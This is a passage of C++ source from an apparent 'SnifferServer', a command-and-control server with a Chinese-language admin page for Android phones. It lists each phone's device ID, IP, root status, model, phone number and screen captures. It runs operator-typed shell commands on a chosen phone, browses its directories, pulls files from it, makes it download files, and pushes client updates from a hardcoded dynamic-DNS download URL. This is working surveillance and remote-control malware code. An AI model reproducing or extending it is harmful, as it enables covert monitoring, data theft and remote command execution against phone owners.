//		char temp[1024];
//		Arithmetic ari;
//		ari.encode_url(client->screencap.c_str(), client->screencap.length(), temp);
		screencap = client->screencap;

		ret = 1;
	}
	mClientMap.Unlock();

	switch( ptType ) {
	case HTML:{
		result = "<html><head><title>客户端管理页面</title><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /></head><body>";
		result += "<pre>";

		if( ret == 1 ) {
			result += "<b>客户端详细信息</b>\n";

			char line[1024];
			snprintf(line, sizeof(line) - 1,
					"%-10s : %s\n",
					CLIENT_ID,
					clientId.c_str()
					);
			result += line;

			snprintf(line, sizeof(line) - 1,
					"%-10s : %s\n",
					DEVICE_ID,
					deviceId.c_str()
					);
			result += line;

			snprintf(line, sizeof(line) - 1,
					"%-10s : %s\n",
					"IP",
					ip.c_str()
					);
			result += line;

			snprintf(line, sizeof(line) - 1,
					"%-10s : %s\n",
					IS_ROOT,
					isRoot?"true":"false"
					);
			result += line;

			snprintf(line, sizeof(line) - 1,
					"%-10s : %s\n",
					VERSION,
					version.c_str()
					);
			result += line;
			result += "\n";

			snprintf(line, sizeof(line) - 1,
					"%-16s : %s\n",
					"处理器架构",
					abi.c_str()
					);
			result += line;

			snprintf(line, sizeof(line) - 1,
					"%-15s : %s\n",
					"手机厂商",
					brand.c_str()
					);
			result += line;

			snprintf(line, sizeof(line) - 1,
					"%-15s : %s\n",
					"手机型号",
					model.c_str()
					);
			result += line;

			snprintf(line, sizeof(line) - 1,
					"%-15s : %s\n",
					"手机号码",
					phoneNumber.c_str()
					);
			result += line;
			result += "\n";

			result += "<form action=\"";
			result += GET_CLIENT_DIR;
			result += "\" method=\"GET\">";
			result += "<input type=\"submit\" value=\"浏览目录\"/>";
			result += "<input type=\"hidden\" name=\"";
			result += CLIENT_ID;
			result += "\" value=\"";
			result += clientId;
			result += "\"/>";
			result += "</form>";

			result += "<form action=\"";
			result += SET_CLIENT_CMD;
			result += "\" method=\"GET\">";
			result += "<input type=\"submit\" value=\"执行命令\"/>";
			result += "<input type=\"text\" name=\"";
			result += COMMAND;
			result += "\"/>";
			result += "<input type=\"hidden\" name=\"";
			result += CLIENT_ID;
			result += "\" value=\"";
			result += clientId;
			result += "\"/>";
			result += "</form>";
			result += "\n";

			if( screencap.length() > 0 ) {
				result += "<img src=\"";
				result += screencap;
				result += "\" width=\"200px\" />";
				result += "\n";
			}

		} else {
			result += "<b>没有客户端详细信息</b>\n";
		}

		result += "</pre>";
		result += "</body></html>";

	}break;
	case JSON:{
		Json::FastWriter writer;
		Json::Value rootSend;
		Json::Value clientNode;

		clientNode[CLIENT_ID] = client->fd;
		clientNode[DEVICE_ID] = client->deviceId;
		clientNode[PHONE_INFO_BRAND] = client->brand;
		clientNode[PHONE_INFO_MODEL] = client->model;
		clientNode[PHONE_INFO_NUMBER] = client->phoneNumber;

		rootSend[CLIENT_INFO] = clientNode;
		rootSend[COMMON_RET] = ret;

		result = writer.write(rootSend);

	}break;
	}

	return ret;
}

/**
 * 对指定客户端运行命令
 */
int SnifferServer::SetClientCmd(
		const string& clientId,
		const string& command,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	int ret = -1;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::SetClientCmd( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"command : %s, "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId.c_str(),
			command.c_str(),
			ptType
			);

	int iClientId = atoi(clientId.c_str());

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;
		if( client != NULL ) {
			// 创建命令
			SetClientCmdTask* task = new SetClientCmdTask();
			task->SetPtType(ptType);
			task->SetCommand(command);

			// 发送命令
			if( SendRequestMsg2Client(m->fd, client, (ITask*)task) ) {
				ret = 0;
			}
		}

	}
	mClientMap.Unlock();

	return ret;
}

int SnifferServer::GetClientDir(
		const string& clientId,
		const string& directory,
		const string& pageIndex,
		const string& pageSize,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	int ret = -1;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::GetClientDir( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"directory : %s, "
			"pageIndex : %s, "
			"pageSize : %s, "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId.c_str(),
			directory.c_str(),
			pageIndex.c_str(),
			pageSize.c_str(),
			ptType
			);

	int iClientId = atoi(clientId.c_str());

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;

		// 创建命令
		GetClientDirTask* task = new GetClientDirTask();
		task->SetPtType(ptType);
		task->SetClientId(iClientId);
		task->SetDir(directory, client->cwd);

		if( pageIndex.length() > 0 ) {
			task->SetPageIndex(atoi(pageIndex.c_str()));
		}

		if( pageSize.length() > 0 ) {
			task->SetPageSize(atoi(pageSize.c_str()));
		}

		// 发送命令
		if( SendRequestMsg2Client(m->fd, client, (ITask*)task) ) {
			ret = 0;
		}
	}
	mClientMap.Unlock();

	return ret;
}

int SnifferServer::UploadClientFile(
		const string& clientId,
		const string& filePath,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	int ret = -1;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::UploadClientFile( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"filePath : %s, "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId.c_str(),
			filePath.c_str(),
			ptType
			);

	int iClientId = atoi(clientId.c_str());

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;

		// 创建命令
		UploadClientFileTask* task = new UploadClientFileTask();
		task->SetPtType(ptType);
		task->SetClientId(iClientId);
		task->SetFilePath(filePath);

		// 发送命令
		if( SendRequestMsg2Client(m->fd, client, (ITask*)task) ) {
			ret = 0;
		}
	}
	mClientMap.Unlock();

	return ret;
}

int SnifferServer::DownloadClientFile(
		const string& clientId,
		const string& url,
		const string& filePath,
		const string& fileName,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	int ret = -1;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::DownloadClientFile( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"url : %s, "
			"filePath : %s, "
			"fileName : %s, "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId.c_str(),
			url.c_str(),
			filePath.c_str(),
			fileName.c_str(),
			ptType
			);

	int iClientId = atoi(clientId.c_str());

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;

		// 创建命令
		DownloadClientFileTask* task = new DownloadClientFileTask();
		task->SetPtType(ptType);
		task->SetClientId(iClientId);
		task->SetUrl(url);

		string file = filePath;
		if( file.length() == 0 || file[file.length() -1] != '/' ) {
			file += "/";
		}
		file += fileName;
		task->SetFilePath(file);

		// 发送命令
		if( SendRequestMsg2Client(m->fd, client, (ITask*)task) ) {
			ret = 0;
		}
	}
	mClientMap.Unlock();

	return ret;
}

/**
 * 踢掉客户端
 */
int SnifferServer::KickClient(
		string& result,
		const string& clientId,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	int ret = -1;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::KickClient( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId.c_str(),
			ptType
			);

	int iClientId = atoi(clientId.c_str());

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;
		mClientTcpServer.Disconnect(client->fd);
		ret = 1;
	}
	mClientMap.Unlock();

	switch( ptType ) {
	case HTML:{
		result = "<html><head><title>客户端管理页面</title><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /></head><body>";
		result += "<pre>";

		if( ret == 1 ) {
			result += "<b>踢掉客户端已成功</b>\n";
		} else {
			result += "<b>踢掉客户端失败</b>\n";
		}

		result += "</pre>";
		result += "</body></html>";

	}break;
	case JSON:{
		Json::FastWriter writer;
		Json::Value rootSend;

		rootSend[COMMON_RET] = ret;

		result = writer.write(rootSend);

	}break;
	}

	return ret;
}

/**
 * 更新客户端
 */
int SnifferServer::UpdateClient(
		string& result,
		const string& clientId,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	int ret = -1;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::UpdateClient( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId.c_str(),
			ptType
			);

	int iClientId = atoi(clientId.c_str());

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;

		Message* sm = mClientTcpServer.GetIdleMessageList()->PopFront();
		if( sm != NULL ) {
			SCMD* scmd = (SCMD*)sm->buffer;

			int seq = client->AddSeq();
			string url = "http://drsniffer.wicp.net:9875/download.cgi?filepath=/update/";
			url += client->abi;
			url += "/";

			UpdateClientTask task;
			task.SetPtType(ptType);
			task.SetUrl(url);
			task.SetVersion("1.0.4");
			task.GetSendCmd(scmd, seq);

			sm->fd = client->fd;
			sm->len = sizeof(SCMDH) + scmd->header.len;

			mClientTcpServer.SendMessageByQueue(sm);

			ret = 1;
		}

	}
	mClientMap.Unlock();

	switch( ptType ) {
	case HTML:{
		result = "<html><head><title>客户端管理页面</title><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /></head><body>";
		result += "<pre>";

		if( ret == 1 ) {
			result += "<b>发送更新客户端命令成功</b>\n";
		} else {
			result += "<b>发送更新客户端命令失败</b>\n";
		}

		result += "</pre>";
		result += "</body></html>";

	}break;
	case JSON:{
		Json::FastWriter writer;
		Json::Value rootSend;

		rootSend[COMMON_RET] = ret;

		result = writer.write(rootSend);

	}break;
	}

	return ret;
}
